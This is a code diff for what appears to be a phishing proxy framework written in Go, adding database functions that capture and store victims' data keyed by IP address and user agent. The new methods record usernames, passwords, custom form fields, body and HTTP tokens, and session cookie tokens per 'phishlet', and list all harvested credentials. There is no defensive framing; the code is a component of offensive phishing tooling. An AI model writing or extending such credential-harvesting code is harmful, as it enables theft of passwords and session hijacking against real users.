@@ -24,6 +24,7 @@ func NewDatabase(path string) (*Database, error) {
 	}
 
 	d.sessionsInit()
+	d.credentialsInit()
 
 	d.db.Shrink()
 	return d, nil
@@ -85,6 +86,40 @@ func (d *Database) DeleteSessionById(id int) error {
 	}
 	err = d.sessionsDelete(id)
 	return err
+}
+
+// Public API for IP+UA-based credential capture
+func (d *Database) CreateOrGetCredential(ipUA string, phishlet string, landing_url string, useragent string, remote_addr string, logIndex int) error {
+	_, err := d.GetOrCreateCredential(ipUA, phishlet, landing_url, useragent, remote_addr, logIndex)
+	return err
+}
+
+func (d *Database) UpdateCredentialUsername(ipUA string, username string) error {
+	return d.SetCredentialUsername(ipUA, username)
+}
+
+func (d *Database) UpdateCredentialPassword(ipUA string, password string) error {
+	return d.SetCredentialPassword(ipUA, password)
+}
+
+func (d *Database) UpdateCredentialCustom(ipUA string, name string, value string) error {
+	return d.SetCredentialCustom(ipUA, name, value)
+}
+
+func (d *Database) UpdateCredentialBodyTokens(ipUA string, tokens map[string]string) error {
+	return d.SetCredentialBodyTokens(ipUA, tokens)
+}
+
+func (d *Database) UpdateCredentialHttpTokens(ipUA string, tokens map[string]string) error {
+	return d.SetCredentialHttpTokens(ipUA, tokens)
+}
+
+func (d *Database) UpdateCredentialCookieTokens(ipUA string, tokens map[string]map[string]*CookieToken) error {
+	return d.SetCredentialCookieTokens(ipUA, tokens)
+}
+
+func (d *Database) GetAllCredentials() ([]*Credential, error) {
+	return d.ListCredentials()
 }
 
 func (d *Database) Flush() {
